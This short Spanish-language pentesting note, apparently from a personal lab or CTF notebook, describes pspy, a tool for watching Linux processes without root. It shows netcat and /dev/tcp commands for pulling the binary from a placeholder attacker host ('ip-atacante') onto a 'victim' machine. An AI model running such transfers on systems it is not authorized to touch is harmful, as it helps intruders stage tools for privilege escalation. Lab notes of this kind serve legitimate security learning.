((https://github.com/DominicBreuker/pspy))
Una herramienta pata ver los procesos que estan ocurriendo en Linux, sin necesidad de ser root, ya que espera a que se ejecuten para detectarlo, también podemos ver el usuario (Nos da el UID que luego tendremos que revisar en el /etc/passwd) que lo ha ejecutado

```bash
./pspy64 -pf -i 1000 
```
![[Pasted image 20241014124912.png]]
para poder pasar el archivo podemos usar `curl`, `wget` o asi:
- Equipo del atacante
```bash
nc -nlvp 4444 < pspy64
```
- victima
```bash
cat < /dev/tcp/ip-atacante/4444 >pspy64
```
![[Pasted image 20241014125202.png]]
para ver si se ha transferido correctamente podemos haccer un md5sum
![[Pasted image 20241014125259.png]]
